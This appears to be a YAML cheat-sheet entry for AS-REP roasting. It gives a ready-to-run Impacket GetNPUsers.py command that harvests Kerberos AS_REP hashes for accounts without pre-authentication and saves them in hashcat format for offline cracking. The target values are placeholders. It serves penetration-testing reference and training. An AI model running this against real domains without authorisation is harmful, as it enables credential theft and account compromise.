---
description: |
  Impacket's GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username List: usernames.txt

  	Output File: hashes.txt

items:
  Username:
    - code: |
        python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
filters:
  Kerberos:
    - code: |
        empty
  Linux:
    - code: |
        empty
  Windows:
    - code: |
        empty
---
